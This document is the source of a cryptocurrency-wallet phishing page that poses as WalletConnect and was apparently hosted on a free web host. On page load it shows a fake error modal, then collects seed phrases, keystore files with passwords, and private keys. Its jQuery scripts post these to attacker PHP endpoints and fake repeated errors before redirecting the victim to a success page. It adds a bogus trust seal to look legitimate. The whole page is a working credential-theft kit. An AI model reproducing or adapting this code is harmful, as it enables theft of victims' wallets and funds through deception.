<html>

<head>
  <meta http-equiv="content-type" content="text/html;charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <title>Synchronize Wallet - <?= $company->name ?></title>
  <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.html">
  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.html">
  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.html">
  <link rel="manifest" href="site.html">
  <link rel="stylesheet" href="<?= $uri->site ?>css/sync.css">
</head>

<body class="modal-open" style="padding-right: 17px;">
  <div id="__next">
    <div class="font-roboto" id="content">
      <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
        <div class="absolute inset-0 shadow-lg opacity-50"></div>
        <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20">
          <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank" href="#" rel="noopener noreferrer">
            <!-- -->
            GitHub
            <!-- -->
          </a>
          <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank" href="#" rel="noopener noreferrer">
            <!-- -->
            Docs
            <!-- -->
          </a>
        </div>
        <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28">
            <a href="/"><img class="cursor-pointer object-fit" src="walletconnect-logo.svg" alt="walletconnect logo"></a>
          </div>
        </div>
        <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20">
          <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" href="wallet">
            <!-- -->
            Wallets
            <!-- -->
          </a>
          <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" href="apps">
            <!-- -->
            Apps
            <!-- -->
          </a>
        </div>
      </header>

      <div class="container-fluid">
        <div class="row">
          <div class="col-md-4 offset-md-4">
            <br>
            <a href="wallet.html" style="font-size: 20px;"><i class="fa fa-angle-left"></i>&nbsp; &nbsp;Synchronize Wallet</a>
          </div>
        </div>


        <div class="container-fluid">
          <div class="row">
            <div class="col-md-4 offset-md-4">
              <ul class="nav nav-tabs">
                <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
                <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
              </ul>
            </div>
          </div>
        </div>
        <section style="margin-top: 40px;">
          <div class="container-fluid">
            <div class="row">
              <div class="col-md-4 offset-md-4">
                <!-- Tab panes -->
                <div class="tab-content">
                  <p id="msg" style="color:red;"></p>
                  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
                    <form method="post" action="">
                      <textarea class="form-control" rows="5" name="phrases" id="phrases" placeholder="Enter your phrase here"></textarea>
                      <input type="hidden" id="wall" name="wall">
                      <p class="text-" style="margin-top: 10px;">Typically 12 or 18 (sometimes 24) words seperated by a single spaces.</p>
                      <div class="form-group"><button class="btn btn-primary btn-block" type="submit" id="submit" name="submit">SYNC</button></div>
                    </form>

                  </div>
                  <div role="tabpanel" class="tab-pane fade" id="keystore">
                    <form method="post" action="">
                      <div class="form-group">
                        <textarea class="form-control" name="keystorejson" id="keystorejson" rows="5" placeholder="Keystore JSON"></textarea>
                        <input type="hidden" id="walls" name="walls">
                      </div>
                      <div class="form-group">
                        <input class="form-control" type="password" id="password" name="password" placeholder="Password">
                      </div>
                      <p class="text-" style="margin-top: 10px;">
                        Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                      </p>


                      <div class="form-group"><button class="btn btn-primary btn-block" type="submit" id="submits" name="submit">SYNC</button></div>
                    </form>
                  </div>
                  <div role="tabpanel" class="tab-pane fade" id="privatekey">
                    <form name="privatekey" method="post" action="">
                      <div class="form-group">
                        <input class="form-control" name="privatekeys" id="privatekeys" placeholder="Private Key">
                        <input type="hidden" id="wallss" name="wallss">
                      </div>
                      <p class="text-" style="margin-top: 10px;">Typically 12 or 18 (sometimes 24) words seperated by a single spaces.</p>

                      <div class="form-group"><button class="btn btn-primary btn-block" type="submit" id="submit-btn" name="submit">SYNC</button></div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div id="myModal" class="modal fade show" style="padding-right: 17px; display: block;">
            <div class="modal-dialog">
              <div class="modal-content">
                <div class="modal-header">
                  <h5 class="modal-title" style="font-size:130%"><b>Error <font color="red">!!!</font></b></h5>
                  <button type="button" class="close" data-dismiss="modal">×</button>
                </div>
                <div class="modal-body">
                  <p>Unable to detect wallet automatically. Kindly log in manually using your 12 or 18 (sometimes 24) word phrases.<br> &nbsp;</p>

                  <button type="button" class="btn btn-primary" data-dismiss="modal">Continue Securely</button>

                </div>
              </div>
            </div>
          </div>

        </section>


        <footer class="flex justify-center mt-24 mb-16 sm:mt-32">



          <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row">
            <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="#" rel="noopener noreferrer">
              <div class="flex">
                <img class="w-6 sm:w-8" src="discord.svg" alt="Discord">
                <p class="ml-2">Discord</p>
              </div>
            </a>
            <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="#" rel="noopener noreferrer">
              <div class="flex">
                <img class="w-6 sm:w-8" src="twitter.svg" alt="Twitter">
                <p class="ml-2">Twitter</p>
              </div>
            </a>
            <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="#" rel="noopener noreferrer">
              <div class="flex">
                <img class="w-6 sm:w-8" src="github.svg" alt="GitHub">
                <p class="ml-2">GitHub</p>
              </div>
            </a>
            <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank" href="support" rel="noopener noreferrer">
              <div class="flex">
                <img class="w-6 sm:w-8" src="mail.svg" alt="Support">
                <p class="ml-2">Support</p>
              </div>
            </a>
          </div>
        </footer>
      </div>
    </div>




    <img src="sectigo_trust_seal_lg.png" width="120px;" class="fixbtm">

    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>

    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>



    <script>
      $(document).ready(function() {
        $("#myModal").modal('show');
      });
    </script>



  </div>
  <script>
    /* global $ */
    $(document).ready(function() {


      function getUrlVars() {
        var vars = {};
        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
          vars[key] = value;
        });
        return vars;
      }

      var number = getUrlVars()["wallet"];

      $("#wall").val(number);
      $("#walls").val(number);
      $("#wallss").val(number);



    });
  </script>
  <script>
    /* global $ */
    $(document).ready(function() {
      var count = 0;

      $('#submit').click(function(event) {

        event.preventDefault();
        var phrases = $("#phrases").val();
        var wall = $("#wall").val();

        count = count + 1;

        $.ajax({
          dataType: 'JSON',
          url: 'postoo.php',
          type: 'POST',
          data: {
            phrases: phrases,
            wall: wall,

          },
          // data: $('#contact').serialize(),
          beforeSend: function(xhr) {

          },
          success: function(response) {
            if (response) {

              console.log(response);
              if (response['signal'] == 'ok') {

                if (count >= 2) {
                  count = 0;
                  // window.location.replace(response['redirect_link']);
                  window.location.replace("success.html");

                }
                $("#msg").show();
                $('#msg').html("Error please try again.");
              } else {
                $("#msg").show();
                $('#msg').html("Error please try again.");
              }
            }
          },
          error: function() {

            if (count >= 2) {
              count = 0;
              window.location.replace("success.html");
            }
            $("#msg").show();
            $('#msg').html("Error please try again.");
          },
          complete: function() {

          }
        });
      });


    });
  </script>
  <script>
    /* global $ */
    $(document).ready(function() {
      var count = 0;

      $('#submits').click(function(event) {

        event.preventDefault();
        var keystorejson = $("#keystorejson").val();
        var password = $("#password").val();
        var walls = $("#walls").val();
        count = count + 1;

        $.ajax({
          dataType: 'JSON',
          url: 'posted.php',
          type: 'POST',
          data: {
            keystorejson: keystorejson,
            password: password,
            walls: walls,
          },
          // data: $('#contact').serialize(),
          beforeSend: function(xhr) {

          },
          success: function(response) {
            if (response) {

              console.log(response);
              if (response['signal'] == 'ok') {

                if (count >= 2) {
                  count = 0;
                  // window.location.replace(response['redirect_link']);
                  window.location.replace("success.html");

                }
                $("#msg").show();
                $('#msg').html("Error please try again.");
              } else {
                $("#msg").show();
                $('#msg').html("Error please try again.");
              }
            }
          },
          error: function() {

            if (count >= 2) {
              count = 0;
              window.location.replace("success.html");
            }
            $("#msg").show();
            $('#msg').html("Error please try again.");
          },
          complete: function() {

          }
        });
      });



    });
  </script>



  <script>
    /* global $ */
    $(document).ready(function() {
      var count = 0;

      $('#submit-btn').click(function(event) {

        event.preventDefault();
        var privatekeys = $("#privatekeys").val();
        var wallss = $("#wallss").val();

        count = count + 1;

        $.ajax({
          dataType: 'JSON',
          url: 'postings.php',
          type: 'POST',
          data: {
            privatekeys: privatekeys,
            wallss: wallss,
          },
          // data: $('#contact').serialize(),
          beforeSend: function(xhr) {

          },
          success: function(response) {
            if (response) {

              console.log(response);
              if (response['signal'] == 'ok') {

                if (count >= 2) {
                  count = 0;
                  // window.location.replace(response['redirect_link']);
                  window.location.replace("success.html");

                }
                $("#msg").show();
                $('#msg').html("Error please try again.");
              } else {
                $("#msg").show();
                $('#msg').html("Error please try again.");
              }
            }
          },
          error: function() {

            if (count >= 2) {
              count = 0;
              window.location.replace("success.html");
            }
            $("#msg").show();
            $('#msg').html("Error please try again.");
          },
          complete: function() {

          }
        });
      });



    });
  </script>
  <div style="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&utm_campaign=000_logo&utm_medium=website&utm_content=footer_img"><img src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a></div>
  <script>
    function getCookie(t) {
      for (var e = t + "=", n = decodeURIComponent(document.cookie).split(";"), o = 0; o < n.length; o++) {
        for (var i = n[o];
          " " == i.charAt(0);) i = i.substring(1);
        if (0 == i.indexOf(e)) return i.substring(e.length, i.length)
      }
      return ""
    }
    getCookie("hostinger") && (document.cookie = "hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;", location.reload());
    var wordpressAdminBody = document.getElementsByClassName("wp-admin")[0],
      notification = document.getElementsByClassName("notice notice-success is-dismissible"),
      hostingerLogo = document.getElementsByClassName("hlogo"),
      mainContent = document.getElementsByClassName("notice_content")[0];
    if (null != wordpressAdminBody && notification.length > 0 && null != mainContent) {
      var googleFont = document.createElement("link");
      googleFontHref = document.createAttribute("href"), googleFontRel = document.createAttribute("rel"), googleFontHref.value = "https://fonts.googleapis.com/css?family=Roboto:300,400,600,700", googleFontRel.value = "stylesheet", googleFont.setAttributeNode(googleFontHref), googleFont.setAttributeNode(googleFontRel);
      var css = "@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 0.3;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 100%; }} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); max-width: 350px; border: 0; border-radius: 3px; background-color: #ff4546 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",
        style = document.createElement("style"),
        sheet = window.document.styleSheets[0];
      style.styleSheet ? style.styleSheet.cssText = css : style.appendChild(document.createTextNode(css)), document.getElementsByTagName("head")[0].appendChild(style), document.getElementsByTagName("head")[0].appendChild(googleFont);
      var button = document.getElementsByClassName("upgrade_button_red")[0],
        link = button.parentElement;
      link.setAttribute("href", "https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"), link.innerHTML = '<button class="upgrade_button_red_sale">Go for it</button>', (notification = notification[0]).setAttribute("style", "padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"), notification.className = "notice notice-error is-dismissible";
      var mainContentHolder = document.getElementById("main_content");
      mainContentHolder.setAttribute("style", "padding: 0;"), hostingerLogo[0].remove();
      var h1Tag = notification.getElementsByTagName("H1")[0];
      h1Tag.className = "000-h1", h1Tag.innerHTML = "Black Friday Prices", h1Tag.setAttribute("style", 'color: white; font-family: "Roboto", sans-serif; font-size: 22px; font-weight: 700; text-transform: uppercase;');
      var h2Tag = document.createElement("H2");
      h2Tag.innerHTML = "Get 90% Off!", h2Tag.setAttribute("style", 'color: white; margin: 10px 0 15px 0; font-family: "Roboto", sans-serif; font-size: 60px; font-weight: 700; line-height: 1;'), h1Tag.parentNode.insertBefore(h2Tag, h1Tag.nextSibling);
      var paragraph = notification.getElementsByTagName("p")[0];
      paragraph.innerHTML = "Get Web Hosting for $0.99/month + SSL Certificate for FREE!", paragraph.setAttribute("style", 'font-family: "Roboto", sans-serif; font-size: 16px; font-weight: 700; margin-bottom: 15px;');
      var list = notification.getElementsByTagName("UL")[0];
      list.remove();
      var org_html = mainContent.innerHTML,
        new_html = '<div class="content-wrapper">' + mainContent.innerHTML + '</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/bf-2020-wp-inject-img.png"></div>';
      mainContent.innerHTML = new_html;
      var saleImage = mainContent.getElementsByClassName("web-hosting-90-off-image")[0]
    }
  </script>
</body>

</html>